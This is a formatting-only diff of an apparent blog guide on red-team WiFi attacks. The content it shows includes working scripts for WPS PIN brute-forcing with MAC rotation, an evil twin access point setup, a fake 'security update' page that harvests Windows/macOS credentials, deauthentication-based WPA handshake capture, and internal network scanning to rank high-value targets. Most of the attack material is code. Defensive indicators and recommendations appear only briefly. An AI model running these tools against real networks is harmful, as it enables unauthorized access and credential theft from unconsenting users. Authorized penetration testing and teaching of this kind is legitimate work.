@@ -1,12 +1,12 @@
 ---
-title: "Red Team WiFi Penetration Testing: Complete Methodology"
-description: "Advanced wireless penetration testing techniques for red team engagements and comprehensive WiFi security assessment"
+title: 'Red Team WiFi Penetration Testing: Complete Methodology'
+description: 'Advanced wireless penetration testing techniques for red team engagements and comprehensive WiFi security assessment'
 pubDate: 2025-08-28
-category: "guides"
-tags: ["red-team", "wifi", "penetration-testing", "wireless-security"]
-author: "MITM.life"
-difficulty: "advanced"
-readTime: "25 min"
+category: 'guides'
+tags: ['red-team', 'wifi', 'penetration-testing', 'wireless-security']
+author: 'MITM.life'
+difficulty: 'advanced'
+readTime: '25 min'
 ---
 
 # Red Team WiFi Penetration Testing: Complete Methodology
@@ -96,13 +96,13 @@ def analyze_survey_data(csv_file):
                     'power': int(row['Power']) if row['Power'] else 0,
                     'beacons': int(row['# beacons']) if row['# beacons'] else 0
                 })
-    
+
     # Prioritize targets
     targets = sorted(networks, key=lambda x: x['power'], reverse=True)
-    
+
     # Identify vulnerable configurations
     vulnerable = [n for n in targets if 'WEP' in n['privacy'] or 'WPS' in n['privacy']]
-    
+
     return {
         'total_networks': len(networks),
         'high_priority_targets': targets[:10],
@@ -194,10 +194,10 @@ def change_mac():
     """Generate and set random MAC address"""
     mac = "02:00:00:%02x:%02x:%02x" % (
         random.randint(0, 255),
-        random.randint(0, 255), 
+        random.randint(0, 255),
         random.randint(0, 255)
     )
-    
+
     subprocess.run(['ifconfig', 'wlan0mon', 'down'])
     subprocess.run(['ifconfig', 'wlan0mon', 'hw', 'ether', mac])
     subprocess.run(['ifconfig', 'wlan0mon', 'up'])
@@ -206,19 +206,19 @@ def change_mac():
 def wps_attack_with_rotation(bssid, channel):
     """WPS attack with MAC rotation"""
     attempt = 0
-    
+
     while attempt < 1000:  # PIN space is ~11,000
         new_mac = change_mac()
         print(f"Attempt {attempt}: Using MAC {new_mac}")
-        
+
         # Try 10 PINs before rotating
         cmd = f"timeout 60 reaver -i wlan0mon -b {bssid} -c {channel} -vv -r 10:10"
         result = subprocess.run(cmd.split(), capture_output=True, text=True)
-        
+
         if "WPS PIN found" in result.stdout:
             print("SUCCESS!")
             break
-            
+
         attempt += 10
         time.sleep(30)  # Cool down period
 
@@ -242,6 +242,7 @@ sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 1
 ```
 
 **evil_twin.conf:**
+
 ```
 interface=wlan1
 driver=nl80211
@@ -263,35 +264,59 @@ rsn_pairwise=CCMP
 ```html
 <!DOCTYPE html>
 <html>
-<head>
+  <head>
     <title>WiFi Access - Security Update Required</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 50px; }
-        .container { max-width: 400px; margin: auto; }
-        .warning { color: #d93025; font-weight: bold; }
-        input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; }
-        button { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; }
+      body {
+        font-family: Arial, sans-serif;
+        margin: 50px;
+      }
+      .container {
+        max-width: 400px;
+        margin: auto;
+      }
+      .warning {
+        color: #d93025;
+        font-weight: bold;
+      }
+      input[type='password'] {
+        width: 100%;
+        padding: 10px;
+        margin: 10px 0;
+      }
+      button {
+        width: 100%;
+        padding: 10px;
+        background: #1a73e8;
+        color: white;
+        border: none;
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
     <div class="container">
-        <h2>Security Update Required</h2>
-        <p class="warning">⚠️ Your device requires a security update to access this network.</p>
-        <p>Please enter your Windows/MacOS credentials to download the required security patch:</p>
-        
-        <form action="/submit" method="post">
-            <label>Username:</label>
-            <input type="text" name="username" required>
-            
-            <label>Password:</label>
-            <input type="password" name="password" required>
-            
-            <button type="submit">Download Security Update</button>
-        </form>
-        
-        <p><small>This process is required by IT security policy.</small></p>
+      <h2>Security Update Required</h2>
+      <p class="warning">
+        ⚠️ Your device requires a security update to access this network.
+      </p>
+      <p>
+        Please enter your Windows/MacOS credentials to download the required
+        security patch:
+      </p>
+
+      <form action="/submit" method="post">
+        <label>Username:</label>
+        <input type="text" name="username" required />
+
+        <label>Password:</label>
+        <input type="password" name="password" required />
+
+        <button type="submit">Download Security Update</button>
+      </form>
+
+      <p><small>This process is required by IT security policy.</small></p>
     </div>
-</body>
+  </body>
 </html>
 ```
 
@@ -316,14 +341,14 @@ sudo mdk3 wlan0mon b -f ssid_list.txt -s 100
 # Recon module
 function wifi_recon() {
     echo "[+] Starting WiFi reconnaissance..."
-    
+
     # Passive scan
     airodump-ng wlan1mon --write recon_$(date +%Y%m%d_%H%M%S) --output-format csv &
     RECON_PID=$!
-    
+
     sleep 300  # 5 minute scan
     kill $RECON_PID
-    
+
     # Parse results
     python3 /root/analyze_survey.py recon_*.csv
 }
@@ -332,7 +357,7 @@ function wifi_recon() {
 function deploy_evil_twin() {
     local target_ssid=$1
     echo "[+] Deploying evil twin for: $target_ssid"
-    
+
     # Configure hostapd
     cat > /tmp/evil_twin.conf <<EOF
 interface=wlan1
@@ -340,9 +365,9 @@ ssid=$target_ssid
 channel=6
 hw_mode=g
 EOF
-    
+
     hostapd /tmp/evil_twin.conf &
-    
+
     # Start credential harvesting
     python3 /root/credential_harvester.py &
 }
@@ -393,53 +418,53 @@ import json
 
 def discover_internal_network():
     """Discover internal network topology"""
-    
+
     # Get network information
     result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
     networks = []
-    
+
     for line in result.stdout.split('\n'):
         if 'dev' in line and '/' in line:
             network = line.split()[0]
             if not network.startswith('127'):
                 networks.append(network)
-    
+
     # Scan discovered networks
     nm = nmap.PortScanner()
     hosts = {}
-    
+
     for network in networks:
         print(f"[+] Scanning {network}")
         nm.scan(network, arguments='-sn')
-        
+
         for host in nm.all_hosts():
             hosts[host] = {
                 'hostname': nm[host].hostname(),
                 'state': nm[host].state(),
                 'mac': nm[host]['addresses'].get('mac', 'Unknown')
             }
-    
+
     return hosts
 
 def identify_high_value_targets(hosts):
     """Identify high-value targets from discovered hosts"""
-    
+
     hvt = []
     nm = nmap.PortScanner()
-    
+
     for host in hosts:
         print(f"[+] Scanning services on {host}")
         nm.scan(host, '22,23,80,135,139,443,445,3389,5985,5986')
-        
+
         interesting_ports = []
         if host in nm.all_hosts():
             for port in nm[host]['tcp']:
                 service = nm[host]['tcp'][port]['name']
                 state = nm[host]['tcp'][port]['state']
-                
+
                 if state == 'open':
                     interesting_ports.append(f"{port}/{service}")
-        
+
         if interesting_ports:
             hvt.append({
                 'host': host,
@@ -447,7 +472,7 @@ def identify_high_value_targets(hosts):
                 'services': interesting_ports,
                 'priority': calculate_priority(interesting_ports)
             })
-    
+
     return sorted(hvt, key=lambda x: x['priority'], reverse=True)
 
 def calculate_priority(services):
@@ -461,12 +486,12 @@ def calculate_priority(services):
         'winrm': 4,
         'telnet': 3
     }
-    
+
     total = 0
     for service in services:
         service_name = service.split('/')[1].lower()
         total += priority_map.get(service_name, 1)
-    
+
     return total
 
 # Usage
@@ -474,7 +499,7 @@ if __name__ == "__main__":
     print("[+] Starting internal network discovery...")
     hosts = discover_internal_network()
     hvt = identify_high_value_targets(hosts)
-    
+
     print("\n[+] High-Value Targets:")
     for target in hvt:
         print(f"  {target['host']} ({target['hostname']}) - Priority: {target['priority']}")
@@ -486,7 +511,7 @@ if __name__ == "__main__":
 ### Detection Indicators
 
 - Multiple deauthentication frames
-- Unusual probe requests patterns  
+- Unusual probe requests patterns
 - New APs with familiar SSIDs
 - High volume of authentication attempts
 - Unexpected MAC address changes
@@ -525,7 +550,7 @@ class WiFiRedTeam:
         self.interface = interface
         self.results = {}
         self.setup_logging()
-    
+
     def setup_logging(self):
         logging.basicConfig(
             level=logging.INFO,
@@ -536,7 +561,7 @@ class WiFiRedTeam:
             ]
         )
         self.logger = logging.getLogger(__name__)
-    
+
     def enable_monitor_mode(self):
         """Enable monitor mode on wireless interface"""
         try:
@@ -546,11 +571,11 @@ class WiFiRedTeam:
         except Exception as e:
             self.logger.error(f"Failed to enable monitor mode: {e}")
             return False
-    
+
     def reconnaissance(self, duration=300):
         """Perform wireless reconnaissance"""
         self.logger.info("Starting wireless reconnaissance...")
-        
+
         output_file = f"recon_{int(time.time())}"
         cmd = [
             'timeout', str(duration),
@@ -558,21 +583,21 @@ class WiFiRedTeam:
             '--write', output_file,
             '--output-format', 'csv'
         ]
-        
+
         subprocess.run(cmd)
-        
+
         # Parse results
         csv_file = f"{output_file}-01.csv"
         if Path(csv_file).exists():
             self.results['reconnaissance'] = self.parse_airodump_csv(csv_file)
             return True
-        
+
         return False
-    
+
     def parse_airodump_csv(self, csv_file):
         """Parse airodump CSV results"""
         import csv
-        
+
         networks = []
         with open(csv_file, 'r') as f:
             reader = csv.DictReader(f)
@@ -585,16 +610,16 @@ class WiFiRedTeam:
                         'privacy': row.get('Privacy', ''),
                         'power': int(row['Power']) if row.get('Power') else 0
                     })
-        
+
         return networks
-    
+
     def attack_wpa_handshake(self, target):
         """Attack WPA/WPA2 networks for handshake capture"""
         bssid = target['bssid']
         channel = target['channel']
-        
+
         self.logger.info(f"Attacking {bssid} on channel {channel}")
-        
+
         # Start capture
         output_file = f"handshake_{bssid.replace(':', '')}"
         capture_cmd = [
@@ -602,64 +627,64 @@ class WiFiRedTeam:
             '--bssid', bssid, '-w', output_file,
             self.interface
         ]
-        
+
         capture_proc = subprocess.Popen(capture_cmd)
         time.sleep(5)
-        
+
         # Deauth attack
         deauth_cmd = [
             'aireplay-ng', '-0', '10',
             '-a', bssid, self.interface
         ]
-        
+
         subprocess.run(deauth_cmd)
         time.sleep(10)
-        
+
         capture_proc.terminate()
-        
+
         # Check if handshake captured
         cap_file = f"{output_file}-01.cap"
         if Path(cap_file).exists():
             check_cmd = ['aircrack-ng', cap_file]
             result = subprocess.run(check_cmd, capture_output=True, text=True)
-            
+
             if 'handshake' in result.stdout.lower():
                 self.logger.info(f"Handshake captured for {bssid}")
                 return cap_file
-        
+
         return None
-    
+
     def run_automated_attack(self):
         """Run automated WiFi attack sequence"""
         if not self.enable_monitor_mode():
             return False
-        
+
         # Reconnaissance phase
         if not self.reconnaissance():
             self.logger.error("Reconnaissance failed")
             return False
-        
+
         networks = self.results['reconnaissance']
         wpa_networks = [n for n in networks if 'WPA' in n['privacy']]
-        
+
         # Sort by signal strength
         wpa_networks.sort(key=lambda x: x['power'], reverse=True)
-        
+
         # Attack top targets
         for network in wpa_networks[:5]:
             self.logger.info(f"Targeting {network['essid']} ({network['bssid']})")
             handshake_file = self.attack_wpa_handshake(network)
-            
+
             if handshake_file:
                 self.results[network['bssid']] = {
                     'handshake_file': handshake_file,
                     'status': 'captured'
                 }
-        
+
         # Save results
         with open('wifi_redteam_results.json', 'w') as f:
             json.dump(self.results, f, indent=2)
-        
+
         return True
 
 # Usage
@@ -671,24 +696,28 @@ if __name__ == "__main__":
 ## Reporting Template
 
 ### Executive Summary
+
 - Networks identified: [X]
-- Vulnerable networks: [X] 
+- Vulnerable networks: [X]
 - Successful compromises: [X]
 - Time to compromise: [X minutes/hours]
 
 ### Technical Findings
+
 1. **WEP Networks**: [List with signal strength]
 2. **WPS Enabled**: [List with PIN status]
 3. **Weak Passwords**: [Handshakes cracked]
 4. **Evil Twin Susceptible**: [Networks without 802.11w]
 
 ### Risk Assessment
+
 - **Critical**: Immediate network access possible
-- **High**: Credentials harvested through social engineering  
+- **High**: Credentials harvested through social engineering
 - **Medium**: Time-intensive brute force attacks feasible
 - **Low**: Strong security configurations observed
 
 ### Recommendations
+
 1. Disable WPS on all access points
 2. Implement WPA3 where possible
 3. Enable 802.11w Management Frame Protection
@@ -697,4 +726,4 @@ if __name__ == "__main__":
 
 ---
 
-*This guide is intended for authorized red team operations and security testing only. Unauthorized access to wireless networks is illegal.*
+_This guide is intended for authorized red team operations and security testing only. Unauthorized access to wireless networks is illegal._
